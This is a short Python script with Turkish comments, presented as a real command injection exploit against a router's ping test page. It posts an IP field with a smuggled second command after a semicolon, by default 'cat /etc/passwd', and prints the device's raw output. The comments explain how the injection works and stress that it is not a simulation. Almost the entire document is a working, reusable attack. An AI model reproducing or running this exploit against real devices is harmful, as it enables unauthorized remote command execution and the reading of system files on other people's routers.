import requests

# --- REAL COMMAND INJECTION EXPLOIT ---
# SİMÜLASYON DEĞİL. UZAKTAKİ CİHAZDA KOMUT ÇALIŞTIRIR.

def exploit_router(target_url, command):
    print(f"[*] HEDEF SİSTEME KOMUT GÖNDERİLİYOR: {command}")
    
    # SALDIRI PAYLOAD'I (Zehirli Paket)
    # Mantık: Router "ping 8.8.8.8" çalıştıracak sanıyor.
    # Ama biz "8.8.8.8; cat /etc/passwd" gönderiyoruz.
    # ";" işareti "önceki komutu bitir, sıradakini (bizimkini) çalıştır" demek.
    
    payload = {
        'ip_address': f'127.0.0.1; {command}', # <--- ZEHİR BURADA
        'submit': 'Ping Test'
    }

    try:
        # 1. ZEHİRLİ PAKETİ YOLLA (POST Request)
        # Bu kısım hedef cihazın "Ping" sayfasına veri gönderir.
        response = requests.post(target_url, data=payload, timeout=5)
        
        # 2. SONUCU OKU
        # Cihaz komutu çalıştırıp cevabını HTML içinde geri döner.
        if response.status_code == 200:
            print("-" * 40)
            print("[+] CİHAZDAN GELEN CEVAP (Raw Output):")
            print("-" * 40)
            # Gelen cevabın sadece ilgili kısmını süzmek gerekir ama
            # burada ham veriyi (raw) basıyoruz.
            print(response.text[:1000]) # İlk 1000 karakteri göster
            print("-" * 40)
        else:
            print("[-] Hedef cevap vermedi veya sayfa yok.")

    except Exception as e:
        print(f"[HATA] Bağlantı kurulamadı: {e}")

if __name__ == "__main__":
    # DİKKAT: Bu adres, zafiyeti olan sayfanın tam adresi olmalı.
    # Örnek: http://192.168.1.1/ping_test.cgi
    VULN_URL = "http://192.168.1.1/cgi-bin/ping_test"
    
    # Router'ın içindeki kullanıcıları listeleme komutu (Linux)
    CMD = "cat /etc/passwd"
    
    exploit_router(VULN_URL, CMD)